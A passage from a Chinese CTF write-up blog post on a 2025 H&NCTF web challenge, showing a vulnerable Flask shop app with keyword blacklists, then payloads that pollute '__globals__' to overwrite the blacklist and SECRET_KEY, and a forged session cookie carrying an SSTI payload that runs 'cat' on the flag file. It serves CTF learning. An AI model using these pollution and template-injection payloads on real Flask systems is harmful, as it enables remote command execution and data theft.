document.getElementById(&#x27;price&#x27;).value;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            fetch(`/add?price=$&#123;encodeURIComponent(priceInput)&#125;`, &#123;</span><br><span class="hljs-string">                                method: &#x27;POST&#x27;,</span><br><span class="hljs-string">                                headers: &#123;</span><br><span class="hljs-string">                                    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="hljs-string">                                &#125;,</span><br><span class="hljs-string">                                body: nameInput</span><br><span class="hljs-string">                            &#125;)</span><br><span class="hljs-string">                            .then(response =&gt; response.text())</span><br><span class="hljs-string">                            .then(data =&gt; alert(data))</span><br><span class="hljs-string">                            .catch(error =&gt; console.error(&#x27;错误:&#x27;, error));</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                    &lt;/script&gt;</span><br><span class="hljs-string">                &lt;/body&gt;</span><br><span class="hljs-string">            &lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.data:<br>            <span class="hljs-keyword">try</span>:<br>                raw_data = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">if</span> check(raw_data):<br>                <span class="hljs-comment">#检测添加的商品是否合法</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;该商品违规，无法上传&quot;</span><br>                json_data = json.loads(raw_data)<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(json_data, <span class="hljs-built_in">dict</span>):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败1&quot;</span><br><br>                merge(json_data, add)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你无法添加商品哦&quot;</span><br><br>            <span class="hljs-keyword">except</span> (UnicodeDecodeError, json.JSONDecodeError):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败2&quot;</span><br>            <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;添加失败3&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;添加失败4&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败5&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aaadminnn&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> session.get(<span class="hljs-string">&#x27;permission&#x27;</span>) != <span class="hljs-number">0</span>:<br>        permission = session.get(<span class="hljs-string">&#x27;permission&#x27;</span>)<br>        <span class="hljs-keyword">if</span> check1(permission):<br>            <span class="hljs-comment"># 检测添加的商品是否合法</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;非法权限&quot;</span><br><br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;上传成功！&quot;);window.location.href=&quot;/aaadminnn&quot;;&lt;/script&gt;&#x27;</span><br><br>        upload_form = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;h2&gt;商品管理系统&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;form method=POST enctype=multipart/form-data style=&quot;margin:20px;padding:20px;border:1px solid #ccc&quot;&gt;</span><br><span class="hljs-string">            &lt;h3&gt;上传新商品&lt;/h3&gt;</span><br><span class="hljs-string">            &lt;input type=file name=file required style=&quot;margin:10px&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;small&gt;支持格式：jpg/png（最大2MB）&lt;/small&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;input type=submit value=&quot;立即上传&quot; style=&quot;margin:10px;padding:5px 20px&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br><br>        original_template = <span class="hljs-string">&#x27;Hello admin!!!Your permissions are&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(permission)<br>        new_template = original_template + upload_form<br><br>        <span class="hljs-keyword">return</span> render_template_string(new_template)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;You are not an admin&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">raw_data, forbidden_keywords=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查原始数据中是否包含禁止的关键词</span><br><span class="hljs-string">    如果包含禁止关键词返回 True，否则返回 False</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 设置默认禁止关键词</span><br>    <span class="hljs-keyword">if</span> forbidden_keywords <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        forbidden_keywords = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;SECRET&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;mro&quot;</span>, <span class="hljs-string">&quot;subclasses&quot;</span>, <span class="hljs-string">&quot;builtins&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>]<br><br>    <span class="hljs-comment"># 检查是否包含任何禁止关键词</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> raw_data <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> forbidden_keywords)<br><br>param_black_list = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;%1c&#x27;</span>, <span class="hljs-string">&#x27;%1d&#x27;</span>, <span class="hljs-string">&#x27;%1f&#x27;</span>, <span class="hljs-string">&#x27;%1e&#x27;</span>, <span class="hljs-string">&#x27;%20&#x27;</span>, <span class="hljs-string">&#x27;%2b&#x27;</span>, <span class="hljs-string">&#x27;%2c&#x27;</span>, <span class="hljs-string">&#x27;%3c&#x27;</span>, <span class="hljs-string">&#x27;%3e&#x27;</span>, <span class="hljs-string">&#x27;%c&#x27;</span>, <span class="hljs-string">&#x27;%2f&#x27;</span>,<br>                    <span class="hljs-string">&#x27;b64decode&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>,  <span class="hljs-string">&#x27;flag&#x27;</span>,  <span class="hljs-string">&#x27;set&#x27;</span>,  <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>,  <span class="hljs-string">&#x27;pop(&#x27;</span>,<br>                    <span class="hljs-string">&#x27;setdefault&#x27;</span>, <span class="hljs-string">&#x27;char&#x27;</span>, <span class="hljs-string">&#x27;lipsum&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;endfor&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span> ]<br><br><span class="hljs-comment"># 增强WAF防护</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf_check</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-comment"># 检查是否有不合法的字符</span><br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> param_black_list:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> value:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># 检查是否是自动化工具请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_automated_request</span>():<br>    user_agent = request.headers.get(<span class="hljs-string">&#x27;User-Agent&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).lower()<br>    <span class="hljs-comment"># 如果是常见的自动化工具的 User-Agent，返回 True</span><br>    automated_agents = [<span class="hljs-string">&#x27;fenjing&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-string">&#x27;bot&#x27;</span>, <span class="hljs-string">&#x27;spider&#x27;</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(agent <span class="hljs-keyword">in</span> user_agent <span class="hljs-keyword">for</span> agent <span class="hljs-keyword">in</span> automated_agents)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check1</span>(<span class="hljs-params">value</span>):<br><br>    <span class="hljs-keyword">if</span> is_automated_request():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Automated tool detected&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-comment"># 使用WAF机制检查请求的合法性</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf_check(value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5014</span>)<br></code></pre></td></tr></table></figure>
+
+多了个/aaadminnn路由，然后看他的waf就应该差不多能猜出来要打ssti
+
+我们可以先在/add界面继续污染，把他过滤的param_black_list给污染了（当然相同的都需要Unicode编码{"__globals__" : {"param_black_list" : ["123"]}}/aaadminnn路由的话看到只有session这个点可以注，然后session有两个参数
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">@app.route(<span class="hljs-string">&#x27;/aaadminnn&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-keyword">admin</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;name&#x27;</span>) == &quot;admin&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;permission&#x27;</span>) != <span class="hljs-number">0</span>:<br>        permission = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;permission&#x27;</span>)<br>        <span class="hljs-keyword">if</span> check1(permission):<br>            # 检测添加的商品是否合法<br>            <span class="hljs-keyword">return</span> &quot;非法权限&quot;<br></code></pre></td></tr></table></figure>
+
+name和permission，但是我们不知道它的key要怎么伪造呢，我们又想到了原型链污染，我们可以把这个随机的key污染成一个我们想要的key，SECRET_KEY 一般存储在 Flask 应用对象的 `config` 属性，那我们就可以写了
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<span class="hljs-string">&quot;app&quot;</span> : &#123;<span class="hljs-string">&quot;config&quot;</span> : &#123;<span class="hljs-string">&quot;SECRET_KEY&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>&#125;&#125;&#125;&#125;<br>污染了后就是ssti了<br><br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockApp</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.secret_key = <span class="hljs-string">&#x27;111&#x27;</span><br>        <span class="hljs-variable language_">self</span>.config = &#123;<br>            <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-variable language_">self</span>.secret_key,<br>            <span class="hljs-string">&#x27;SECRET_KEY_FALLBACKS&#x27;</span>: [] <br>        &#125;<br><br>session_data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;permission&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;self.__init__.__globals__.__builtins__[&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat 4flloog&quot;).read()&#125;&#125;&#x27;</span><br>&#125;<br><br>serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())<br>cookie_value = serializer.dumps(session_data)<br><span class="hljs-built_in">print</span>(cookie_value)<br></code></pre></td></tr></table></figure>
+
+去/aaadminnn改session就行了参考自晨曦师傅的wp[https://chenxi9981.github.io/2025H&NCTF_WP/](https://chenxi9981.github.io/2025H&NCTF_WP/)
+
+## 小结
+
+还没写完....
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/wp/%E6%AF%94%E8%B5%9B/" class="category-chain-item">比赛</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025H&amp;amp;NCTF web</div>
+      <div>https://xendr1a.github.io/2025/06/09/2025HampNCTF web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/31/%E5%A4%8D%E7%8E%B0%20ctfshow%20%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98RCE%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/" title="复现 ctfshow 每周大挑战(RCE极限挑战">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">复现 ctfshow 每周大挑战(RCE极限挑战</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/01/TGCTF%202025%20web%E5%A4%8D%E7%8E%B0/" title="TGCTF 2025 web(复现">
+                        <span class="hidden-mobile">TGCTF 2025 web(复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
